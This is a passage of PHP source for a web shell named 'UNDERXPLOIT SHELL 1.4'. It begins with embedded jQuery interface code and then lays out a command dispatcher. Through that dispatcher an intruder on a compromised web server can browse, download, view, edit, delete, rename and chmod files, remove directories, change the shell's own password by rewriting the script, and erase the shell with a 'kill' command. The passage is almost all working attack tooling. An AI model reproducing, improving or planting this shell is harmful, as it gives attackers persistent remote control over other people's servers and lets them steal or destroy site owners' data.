                    if (self.$elem.hasClass(\'pressed\')) {
                        moveTime = setTimeout(function() {
                            self.hide();
                        }, 150);
                    } else {
                        clearTimeout(moveTime);
                    };
                };

                self.$elem.on({
                    mouseenter: function(event) {
                        if (self.$elem.hasClass(\'pressed\')) {
                            clearTimeout(moveTime);
                        } else {
                            self.show();
                        }
                    }
                });

                self.$elem.parent().on({
                    mouseleave: function(event){ decideTimeout(); }
                });

                $(\'.tool-container\').on({
                    mouseenter: function(event){ clearTimeout(moveTime); },
                    mouseleave: function(event){ decideTimeout(); }
                });
            }

            if (self.options.event == \'click\') {
                self.$elem.on(\'click\', function(event) {
                    event.preventDefault();
                    if(self.$elem.hasClass(\'pressed\')) {
                        self.hide();
                    } else {
                        self.show();
                    }
                });

                if (self.options.hideOnClick) {
                    $(\'html\').on("click.toolbar", function ( event ) {
                        if (event.target != self.elem &&
                            self.$elem.has(event.target).length === 0 &&
                            self.toolbar.has(event.target).length === 0 &&
                            self.toolbar.is(":visible")) {
                            self.hide();
                        }
                    });
                }
            }

            if (self.options.hover) {
                var moveTime;

                function decideTimeout () {
                    if (self.$elem.hasClass(\'pressed\')) {
                        moveTime = setTimeout(function() {
                            self.hide();
                        }, 150);
                    } else {
                        clearTimeout(moveTime);
                    };
                };

                self.$elem.on({
                    mouseenter: function(event) {
                        if (self.$elem.hasClass(\'pressed\')) {
                            clearTimeout(moveTime);
                        } else {
                            self.show();
                        }
                    }
                });

                self.$elem.parent().on({
                    mouseleave: function(event){ decideTimeout(); }
                });

                $(\'.tool-container\').on({
                    mouseenter: function(event){ clearTimeout(moveTime); },
                    mouseleave: function(event){ decideTimeout(); }
                });
            }

            $(window).resize(function( event ) {
                event.stopPropagation();
                if ( self.toolbar.is(":visible") ) {
                    self.toolbarCss = self.getCoordinates(self.options.position, 20);
                    self.collisionDetection();
                    self.toolbar.css( self.toolbarCss );
                    self.toolbar_arrow.css( self.arrowCss );
                }
            });
        },

        populateContent: function() {
            var self = this;
            var location = self.toolbar.find(\'.tool-items\');
            var content = $(self.options.content).clone( true ).find(\'a\').addClass(\'tool-item\');
            location.html(content);
            location.find(\'.tool-item\').on(\'click\', function(event) {
                event.preventDefault();
                self.$elem.trigger(\'toolbarItemClick\', this);
            });
        },

        calculatePosition: function() {
            var self = this;
                self.arrowCss = {};
                self.toolbarCss = self.getCoordinates(self.options.position, self.options.adjustment);
                self.toolbarCss.position = \'absolute\';
                self.toolbarCss.zIndex = self.options.zIndex;
                self.collisionDetection();
                self.toolbar.css(self.toolbarCss);
                self.toolbar_arrow.css(self.arrowCss);
        },

        getCoordinates: function( position, adjustment ) {
            var self = this;
            self.coordinates = self.$elem.offset();

            if (self.options.adjustment && self.options.adjustment[self.options.position]) {
                adjustment = self.options.adjustment[self.options.position] + adjustment;
            }

            switch(self.options.position) {
                case \'top\':
                    return {
                        left: self.coordinates.left-(self.toolbar.width()/2)+(self.$elem.outerWidth()/2),
                        top: self.coordinates.top-self.$elem.outerHeight()-adjustment,
                        right: \'auto\'
                    };
                case \'left\':
                    return {
                        left: self.coordinates.left-(self.toolbar.width()/2)-(self.$elem.outerWidth()/2)-adjustment,
                        top: self.coordinates.top-(self.toolbar.height()/2)+(self.$elem.outerHeight()/2),
                        right: \'auto\'
                    };
                case \'right\':
                    return {
                        left: self.coordinates.left+(self.toolbar.width()/2)+(self.$elem.outerWidth()/2)+adjustment,
                        top: self.coordinates.top-(self.toolbar.height()/2)+(self.$elem.outerHeight()/2),
                        right: \'auto\'
                    };
                case \'bottom\':
                    return {
                        left: self.coordinates.left-(self.toolbar.width()/2)+(self.$elem.outerWidth()/2),
                        top: self.coordinates.top+self.$elem.outerHeight()+adjustment,
                        right: \'auto\'
                    };
            }
        },

        collisionDetection: function() {
            var self = this;
            var edgeOffset = 20;
            if(self.options.position == \'top\' || self.options.position == \'bottom\') {
                self.arrowCss = {left: \'50%\', right: \'50%\'};
                if( self.toolbarCss.left < edgeOffset ) {
                    self.toolbarCss.left = edgeOffset;
                    self.arrowCss.left = self.$elem.offset().left + self.$elem.width()/2-(edgeOffset);
                }
                else if(($(window).width() - (self.toolbarCss.left + self.toolbarWidth)) < edgeOffset) {
                    self.toolbarCss.right = edgeOffset;
                    self.toolbarCss.left = \'auto\';
                    self.arrowCss.left = \'auto\';
                    self.arrowCss.right = ($(window).width()-self.$elem.offset().left)-(self.$elem.width()/2)-(edgeOffset)-5;
                }
            }
        },

        show: function() {
            var self = this;
            self.$elem.addClass(\'pressed\');
            self.calculatePosition();
            self.toolbar.show().css({\'opacity\': 1}).addClass(\'animate-\'+self.options.animation);
            self.$elem.trigger(\'toolbarShown\');
        },

        hide: function() {
            var self = this;
            var animation = {\'opacity\': 0};

            self.$elem.removeClass(\'pressed\');

            switch(self.options.position) {
                case \'top\':
                    animation.top = \'+=20\';
                    break;
                case \'left\':
                    animation.left = \'+=20\';
                    break;
                case \'right\':
                    animation.left = \'-=20\';
                    break;
                case \'bottom\':
                    animation.top = \'-=20\';
                    break;
            }

            self.toolbar.animate(animation, 200, function() {
                self.toolbar.hide();
            });

            self.$elem.trigger(\'toolbarHidden\');
        },

        getToolbarElement: function () {
            return this.toolbar.find(\'.tool-items\');
        }
    };

    $.fn.toolbar = function( options ) {
        if ($.isPlainObject( options )) {
            return this.each(function() {
                var toolbarObj = Object.create( ToolBar );
                toolbarObj.init( options, this );
                $(this).data(\'toolbarObj\', toolbarObj);
            });
        } else if ( typeof options === \'string\' && options.indexOf(\'_\') !== 0 ) {
            var toolbarObj = $(this).data(\'toolbarObj\');
            var method = toolbarObj[options];
            return method.apply(toolbarObj, $.makeArray(arguments).slice(1));
        }
    };

    $.fn.toolbar.options = {
        content: \'#myContent\',
        position: \'top\',
        hideOnClick: false,
        zIndex: 120,
        hover: false,
        style: \'default\',
        animation: \'standard\',
        adjustment: 10
    };

}) ( jQuery, window, document );
</script>
<script type="text/javascript"> baseUrl = window.location.href.split("?")[0]; window.history.pushState("name", "?", baseUrl);</script>
<script type="text/javascript"> var to,width,height,position,autohide,opacity;function notifit_setDefaultValues(){width=400;height=60;position="right";autohide=!0;msg="";opacity=1} function notif(config){notifit_setDefaultValues();if(config.position){if(config.position=="center"||config.position=="left"||config.position=="right"){position=config.position}} if(config.width){if(config.width>0){width=config.width}else if(config.width==="all"){width=screen.width-60}} if(config.height){if(config.height<100&&config.height>0){height=config.height}} if(typeof config.autohide!=="undefined") autohide=config.autohide;var div="<div id=\'ui_notifIt\'><p>"+((config.msg)?config.msg:"")+"</p></div>";$("#ui_notifIt").remove();clearInterval(to);$("body").append(div);$("#ui_notifIt").css("height",height);$("#ui_notifIt").css("width",width);switch(position){case "center":$("#ui_notifIt").css("top",parseInt(0-(height+10)));break;case "right":$("#ui_notifIt").css("right",parseInt(0-(width+10)));break;case "left":$("#ui_notifIt").css("left",parseInt(0-(width+10)));break;default:$("#ui_notifIt").css("right",parseInt(0-(width+10)));break} if(config.opacity){$("#ui_notifIt").css("opacity",config.opacity)} switch(config.type){case "error":$("#ui_notifIt").addClass("error");break;case "success":$("#ui_notifIt").addClass("success");break;case "info":$("#ui_notifIt").addClass("info");break;case "warning":$("#ui_notifIt").addClass("warning");break;default:$("#ui_notifIt").addClass("default");break} switch(position){case "left":$("#ui_notifIt").css("left",parseInt(0-(width*2)));break;case "right":$("#ui_notifIt").css("right",parseInt(0-(width*2)));break;case "center":var mid=window.innerWidth/2;$("#ui_notifIt").css("left",mid-parseInt(width/2));break;default:var mid=window.innerWidth/2;$("#ui_notifIt").css("left",mid-parseInt(width/2));break} $("#ui_notifIt p").css("line-height",height+"px");switch(position){case "center":$("#ui_notifIt").animate({top:10});break;case "right":$("#ui_notifIt").animate({right:10});break;case "left":$("#ui_notifIt").animate({left:10});break;default:$("#ui_notifIt").animate({right:10});break} $("#ui_notifIt").click(function(){notifit_dismiss()});if(autohide==!0) to=setTimeout(function(){notifit_dismiss()},5000)} function notifit_dismiss(){clearInterval(to);if(position=="center"){$("#ui_notifIt").animate({top:parseInt(height-(height/2))},100,function(){$("#ui_notifIt").animate({top:parseInt(0-(height*2))},100,function(){$("#ui_notifIt").remove()})})}else if(position=="right"){$("#ui_notifIt").animate({right:parseFloat(width-(width*0.9))},100,function(){$("#ui_notifIt").animate({right:parseInt(0-(width*2))},100,function(){$("#ui_notifIt").remove()})})}else if(position=="left"){$("#ui_notifIt").animate({left:parseFloat(width-(width*0.9))},100,function(){$("#ui_notifIt").animate({left:parseInt(0-(width*2))},100,function(){$("#ui_notifIt").remove()})})} notifit_setDefaultValues()}</script>
<script type="text/javascript">
  (function($) {
    $.fn.linedtextarea = function(options) {
        var opts = $.extend({}, $.fn.linedtextarea.defaults, options);
        var fillOutLines = function(codeLines, h, lineNo) {
            while ((codeLines.height() - h) <= 0) {
                if (lineNo == opts.selectedLine)
                    codeLines.append("<div class=\'lineno lineselect\'>" + lineNo + "</div>");
                else codeLines.append("<div class=\'lineno\'>" + lineNo + "</div>");
                lineNo++
            }
            return lineNo
        };
        return this.each(function() {
            var lineNo = 1;
            var textarea = $(this);
            textarea.attr("wrap", "off");
            textarea.css({
                resize: \'none\'
            });
            var originalTextAreaWidth = textarea.outerWidth();
            textarea.wrap("<div class=\'linedtextarea\'></div>");
            var linedTextAreaDiv = textarea.parent().wrap("<div class=\'linedwrap\' style=\'width:" + originalTextAreaWidth + "px\'></div>");
            var linedWrapDiv = linedTextAreaDiv.parent();
            linedWrapDiv.prepend("<div class=\'lines\' style=\'width:39px\'></div>");
            var linesDiv = linedWrapDiv.find(".lines");
            linesDiv.height(textarea.height() + 6);
            linesDiv.append("<div class=\'codelines\'></div>");
            var codeLinesDiv = linesDiv.find(".codelines");
            lineNo = fillOutLines(codeLinesDiv, linesDiv.height(), 1);
            if (opts.selectedLine != -1 && !isNaN(opts.selectedLine)) {
                var fontSize = parseInt(textarea.height() / (lineNo - 2));
                var position = parseInt(fontSize * opts.selectedLine) - (textarea.height() / 2);
                textarea[0].scrollTop = position
            }
            var sidebarWidth = linesDiv.outerWidth();
            var paddingHorizontal = parseInt(linedWrapDiv.css("border-left-width")) + parseInt(linedWrapDiv.css("border-right-width")) + parseInt(linedWrapDiv.css("padding-left")) + parseInt(linedWrapDiv.css("padding-right"));
            var linedWrapDivNewWidth = originalTextAreaWidth - paddingHorizontal;
            var textareaNewWidth = originalTextAreaWidth - sidebarWidth - paddingHorizontal - 20;
            textarea.width(textareaNewWidth);
            linedWrapDiv.width(linedWrapDivNewWidth);
            textarea.scroll(function(tn) {
                var domTextArea = $(this)[0];
                var scrollTop = domTextArea.scrollTop;
                var clientHeight = domTextArea.clientHeight;
                codeLinesDiv.css({
                    \'margin-top\': (-1 * scrollTop) + "px"
                });
                lineNo = fillOutLines(codeLinesDiv, scrollTop + clientHeight, lineNo)
            });
            textarea.resize(function(tn) {
                var domTextArea = $(this)[0];
                linesDiv.height(domTextArea.clientHeight + 6)
            })
        })
    };
    $.fn.linedtextarea.defaults = {
        selectedLine: -1,
        selectedClass: \'lineselect\'
    }
})(jQuery) </script>';
print '<i class="zmdi zmdi-long-arrow-up zmdi-hc-fw move-top"></i>';
print '<script type="text/javascript">
jQuery(document).ready(function() {
    var offset = 250;
    var duration = 500;
    jQuery(window).scroll(function() {
        if (jQuery(this).scrollTop() > offset) {
            jQuery(\'.move-top\').fadeIn(duration);
        } else {
            jQuery(\'.move-top\').fadeOut(duration);
        }
    });
    jQuery(\'.move-top\').click(function(event) {
        event.preventDefault();
        jQuery(\'html, body\').animate({
            scrollTop: 0
        }, duration);
        return false;
    })
}); </script>
<script type="text/javascript">
	function c(x) {
		window.location = x
} </script>
<script type="text/javascript">jQuery(document).ready(function() {
    var offsets=100;
    var durations=500;
    jQuery(window).scroll(function() {
        if(jQuery(this).scrollTop() > offsets) {
            jQuery(\'#judul\').fadeIn(durations);
            jQuery(\'.menus\').css({\'background\' : \'#222\', \'box-shadow\' : \'0 1px 5px rgba(27,31,35,.15)\'});
}
        else {
            jQuery(\'#judul\').fadeOut(durations);
        	jQuery(\'.menus\').css(\'background\', \'none\');
		 }
    }
    );
}); </script>
<style> .icon { color: #1D9D73; } </style>
<script type="text/javascript">hljs.initHighlightingOnLoad();</script>
</head>
<body>
    <div class="co-ontainer-2">
        <div class="atas">
        <div id="particles-js"></div>
            <div class="menus atas-ae" style="background:none">
                <div class="co-ontainer-3"><span id="judul" class="">UNDERXPLOIT  SHELL 1.4</span>   
                    <button class="xa" onclick=\'c("'.$_SERVER['PHP_SELF']. '")\'><i class="zmdi zmdi-home zmdi-hc-fw"></i></button>
                    <button class="xa" onclick=\'c("?' .x5.getcwd(). '&' .x7. 'about")\'><i class="zmdi zmdi-account-o zmdi-hc-fw"></i></button>
                    <button class="xa" onclick=\'c("?' .x5.getcwd(). '&' .x7.  'logout")\'><i class="zmdi zmdi-power zmdi-hc-fw"></i></button>
				</div>
            </div>
        </div>
        <div class="dir">
            <table style="width:100%">
                <td style="width:100%">
                    <div class="dir-pallet">
                        <table>
                            <td class="dir-td-left"><span class="label-success">ROOT</span> :</td>
                            <td class="break dir-td-right wrap">';

foreach($scdir as $c_dir => $cdir) {
	print '<a class="a" onclick="c(\'?' . x5;
		for ($i = 0; $i <= $c_dir; $i++) {
			print $scdir[$i];
switch (true) {
	case ($i != $c_dir): print '/';
		}
	} print '\')">' . $cdir . '</a>/';
}
print '</td></table></div></th></table></div>';
$filez = basename($_UNDERXPLOIT['file']);
$size = filesize("$dir/$filez") / 1024;
$size = round($size, 3);

switch (true) {
	case ($size > 1024): $size = round($size / 1024, 2) . ' MB';
break;
	default: $size = $size . ' KB';
}
print '<div class="coL">';

switch ($_UNDERXPLOIT['command']) {
	case 'logout': r($_SERVER['PHP_SELF']);
		setcookie(md5($_SERVER['HTTP_HOST']), time() - 3600);
break;

	case 'download': $dir = $_UNDERXPLOIT['file'];
		$file = file_get_contents($dir); ob_end_clean();
		header("Content-type: application/octet-stream");
		header("Content-length: " . strlen($file));
		header("Content-disposition: attachment; filename=" . basename($dir));
		print $file;
		die();
break;

	case 'delete': $delete = unlink($_UNDERXPLOIT['file']);
switch (true) {
	case ($delete): print '<script type="text/javascript">c("?' . x5 . $dir . '");</script>';
break;
	default: bacot('Permission denied');
	}
break;

	case 'deledir': $xzi = deledir($dir);
switch (true) {
	case '$xzi': print '<script type="text/javascript">window.location = "?' . x5 . dirname($dir) . '";</script>';
break;
	default: print '<script type="text/javascript">window.location = "?' . x5 . dirname($dir) . '";</script>';
		bacot('Permission denied');
	}
break;

	case 'view': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">SOURCE VIEWER</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span> ' . basename($_UNDERXPLOIT['file']) . ' <span class="label-success">]</span></td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_UNDERXPLOIT['file']) . '")\'>' . $size . '</td></table><hr>';
		print "<table>
<th><button class='coL-btn-option-active'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></th>
<th><a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-file-text zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-delete zmdi-hc-fw'></i></button></a></th></table></div>";
	$source = htmlspecialchars(@file_get_contents($_UNDERXPLOIT['file']));
switch (true) {
	case (empty($source)): print x9;
		bacot('Source not found');
break;
	default: print '<div id="paksa"><pre class="top"><code class="php">' . $source . '</code></pre></div></div>';
	}
break;

	case 'edit': switch (true) {
	case ($_UNDERXPLOIT['save']): $save = file_put_contents($_UNDERXPLOIT['file'], $_UNDERXPLOIT['src']);
switch (true) {
	case ($save) : bacot('Source saved');
break;
	detault: bacot('Permission denied');
	} 
}

	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">EDIT SOURCE</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span> ' . basename($_UNDERXPLOIT['file']) . ' <span class="label-success">]</span> </td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_UNDERXPLOIT['file']) . '")\'>' . $size . '</td></table><hr>';
	print "<table>
<th><a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></a></th>
<th><button class='coL-btn-option-active'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></th>
<th><a onclick=\"c('?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-file-text zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-delete zmdi-hc-fw'></i></button></a></th></table></div>";
	$source = htmlspecialchars(@file_get_contents($_UNDERXPLOIT['file']));
	
switch (true) {
	case (empty($source)): print "<form method='post' action='?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "'  style='margin:0px'>";
		print '<script type="text/javascript">
$(function() {
	$(".lined").linedtextarea({selectedLine: 1});
}); </script>';
		print "<div id='paksa'><textarea name='src' class='lined' placeholder='// this editor only works for source code.'></textarea><input type='submit' class='btn-exe' value='SAVE' name='save' style='margin-top:3px;width: 100%'></form></div></div>";
break;
	default: print "<form method='post' action='?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "' style='margin:0px'>";
		print '<script type="text/javascript">
$(function() {
	$(".lined").linedtextarea({selectedLine: 1});
}); </script>';
		print "<div id='paksa'><textarea name='src' class='lined' placeholder='// this editor only works for source code.'>" . $source . "</textarea><input type='submit' value='SAVE' name='save' class='btn-exe' style='margin-top:3px;width: 100%'></form></div></div>";
	}
break;

	case 'rename': switch (true) {
	case ($_UNDERXPLOIT['rename']):
		$rename = rename($_UNDERXPLOIT['file'], "$dir/" . htmlspecialchars($_UNDERXPLOIT['rename']) . "");
switch (true) {
	case ($rename): mtr("?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $dir . "/" . $_UNDERXPLOIT["rename"]);
		bacot('File renamed');
break;
	default: bacot('Permission denied');
	}
}
	
	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">RENAME FILE</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span>  ' . basename($_UNDERXPLOIT['file']) . ' <span class="label-success">]</span></td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_UNDERXPLOIT['file']) . '")\'>' . $size . '</td></table><hr>';
	print "<table>
<th><a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></a></th>
<th><button class='coL-btn-option-active'><i class='zmdi zmdi-file-text zmdi-hc-fw'></i></button></th>
<th><a onclick=\"c('?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-delete zmdi-hc-fw'></i></button></a></th></table></div>
	<div class='coL-option top'><br /><br />
	<center>
		<i class='zmdi zmdi-file-text zmdi-hc-fw zmdi-hc-4x'></i></center><br /><br /><form action='?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "' style='margin:0px' method='post'>
<table cellspacing='0'>
	<td align='center' style='width:10%'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i> </td><td style='width:70%'><input type='text' value='" . basename($_UNDERXPLOIT['file']) . "' name='rename' id='vrn'></td><td style='width:20%'>
	<button type='submit' class='btn-exe' id='rn' onclick='rnm(); return false'><i class='zmdi zmdi-long-arrow-return zmdi-hc-fw'></i></button></td></table>
	</form></div></div>";
print '<script type="text/javascript">function rnm(){
if(document.getElementById("vrn").value == ""){'; s('Form do not leave empty');
	print 'document.getElementById("vrn").focus();
      return false;
	} document.getElementById("rn").submit();
} </script>';
break;

	case 'chmod': switch (true) {
	case ($_UNDERXPLOIT['perm']):
switch (true) {
	case (chmod($_UNDERXPLOIT['file'], octdec($_UNDERXPLOIT['perm']))): mtr("?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file']);
		bacot('Items changed mode to '.decoct(octdec($_UNDERXPLOIT['perm'])));
break;
	default: bacot('Permission denied');
	}
}

	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">CHMOD FILE</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span>  ' . basename($_UNDERXPLOIT['file']) . ' <span class="label-success">]</span> </td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_UNDERXPLOIT['file']) . '")\'>' . $size . '</td></table><hr>';
	print "<table>
<th><a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-file-text zmdi-hc-fw'></i></button></a></th>
<th><button class='coL-btn-option-active'><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></button></th>
<th><a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-delete zmdi-hc-fw'></i></button></a></th></table></div>
	<div class='coL-option top'><br /><br>
	<center>
		<i class='zmdi zmdi-wrench zmdi-hc-fw zmdi-hc-4x'></i></center><br><br />
<form action='?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_UNDERXPLOIT['file'] . "' style='margin:0px' method='post'>
<table cellspacing='0'>
	<td align='center' style='width:10%'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i> </td><td style='width:70%'>
<input type='number' value='" . substr(sprintf("%o", fileperms($_UNDERXPLOIT['file'])) , -4) . "' name='perm' style='width:100%' id='decoct'></td><td style='width:20%'>
	<button id='chcrot' class='btn-exe' onclick='chmod(); return false'><i class='zmdi zmdi-long-arrow-return zmdi-hc-fw'></i></button></td></table>
	</form></div></div>";
print '<script type="text/javascript">function chmod(){
if(document.getElementById("decoct").value == ""){'; s('Form do not leave empty');
	print 'document.getElementById("decoct").focus();
      return false;
	} document.getElementById("chcrot").submit();
} </script>';
break;

	case 'change': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">CHANGE PASSWORD</td></table></div>';
function xs($file) {
		return file_get_contents($file);
	}

function chipt($plain) {
		return md5($plain);
	}

function changepass($plain) {
		$npass = chipt($plain);
		$npass = "\$pass = \"" . $npass . "\";";
		$con = xs($_SERVER['SCRIPT_FILENAME']);
		$con = preg_replace("/\\\$pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is", $npass, $con);
		return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
	}

switch (true) {
	case ($_UNDERXPLOIT['newpass']): switch (true) {
	case (chipt($_UNDERXPLOIT['newpass']) == $pass): bacot('Password is the same as at this time');
break;
	case (changepass($_UNDERXPLOIT['newpass'])): mtr('?' . x5 . $dir . '&' . x7 . 'logout');
		bacot('Password changed');
break;
	default: bacot('Unable to change password');
		}
	}
print '<script type="text/javascript">
function validate() {
			var a = document.getElementById("newpass").value;
            var b = document.getElementById("confirm").value;
            if(a!=b) {'; s('Password do not match');
		print 'return false; 
	}
} </script>';
print "<div class='coL-option top'>
    <form method='post' onSubmit='return validate();' action='?" . x7 . "change&" . x5 . $dir . "'>
        <table style='width:100%'>
            <td class='tup' style='width:120px'>Password :</td>
            <td style='width:75%'><input type='password' id='newpass' name='newpass' style='width:100%'></td>
        <tr>
            <td class='tup' style='width:120px'>Confirm :</td>
            <td style='width:75%'><input type='password' id='confirm' name='confirm' style='width:100%'></td>
        <tr>
             <td style='width:120px'></td>
             <td style='width:75%'>
           <button type='submit' name='cps' class='btn-exe' onclick='saveForm();return false;' style='width:100px' id='bck'><i class='zmdi zmdi-long-arrow-return zmdi-hc-fw'></i></button></td>
        </table>
    </form>
</div></div>";
print '<script type="text/javascript">function saveForm(){
if(document.getElementById("newpass").value == ""){';
	s('Enter new password');
		print 'document.getElementById("newpass").focus();
      return false;
    }
if(document.getElementById("confirm").value == ""){';
	s('Confirm your password');
		print 'return false;
    }
    document.getElementById("bck").submit();
}
</script>';
break; 


	case 'kill': switch (true) {
	case (file_exists("underxploit.php")): unlink("underxploit.php"); unlink(__FILE__); bacot('Good Bye Baby :\')');
	mtr('http://underxploit.blogspot.com');
	}
break;

case 'renadir': $c = $_UNDERXPLOIT['e'];
switch (true) {
	case ($_UNDERXPLOIT['e']): $e = rename($dir, "" . dirname($dir) . "/" . htmlspecialchars($_UNDERXPLOIT['e']) . "");
switch (true) {
	case ($e): print '<script type="text/javascript">c("?' . x5 . dirname($dir) . '");</script>';
break;
	default: bacot('Permission denied');
	}
}
	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">RENAME DIRECTORY</td></table></div>';
	print "<div class='coL-option top'><br /><br /><center><i class='zmdi zmdi-folder-outline zmdi-hc-fw zmdi-hc-4x'></i></center><br /><br />";
	print "<form action='?" . x7 . "renadir&" . x5 . $dir . "' style='margin:0px' method='post'><table cellspacing='0'><td align='center' style='width:10%'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i> </td><td style='width:70%'><input type='text' value='" . basename($dir) . "' name='e' id='vrn'></td><td style='width:20%'><button type='submit' class='btn-exe' onclick='rnm(); return false' id='rn'><i class='zmdi zmdi-long-arrow-return zmdi-hc-fw'></i></button></td></table></form></div></div>";
print '<script type="text/javascript">function rnm(){
if(document.getElementById("vrn").value == ""){'; s('Form do not leave empty');
	print 'document.getElementById("vrn").focus();
      return false;
	} document.getElementById("rn").submit();
} </script>';
break;

case 'chmdir': switch (true) {
	case ($_UNDERXPLOIT['perm']):
switch (true) {
	case (chmod($dir, octdec($_UNDERXPLOIT['perm']))): mtr("?" . x7 . "chmdir&" . x5 . $dir);
		bacot('Directory changed mode to '.decoct(octdec($_UNDERXPLOIT['perm'])));
break;
	default: bacot('Permission denied');
	}
}
	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">CHMOD DIRECTORY </td></table></div>';
	print "<div class='coL-option top'><br /><br /><center><i class='zmdi zmdi-wrench zmdi-hc-fw zmdi-hc-4x'></i></center><br /><br />";
	print "<form action='?" . x7 . "chmdir&" . x5 . $dir . "' style='margin:0px' method='post'><table cellspacing='0'><td align='center' style='width:10%'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i> </td><td style='width:70%'><input type='number' value='" . substr(sprintf("%o", fileperms($dir)) , -4)."' name='perm' id='decoct'></td><td style='width:20%'><button type='submit' id='chcrot' onclick='chmod(); return false' class='btn-exe'><i class='zmdi zmdi-long-arrow-return zmdi-hc-fw'></i></button></td></table></form></div></div>";
print '<script type="text/javascript">function chmod(){
if(document.getElementById("decoct").value == ""){'; s('Form do not leave empty');
	print 'document.getElementById("decoct").focus();
      return false;
	} document.getElementById("chcrot").submit();
} </script>';
break;

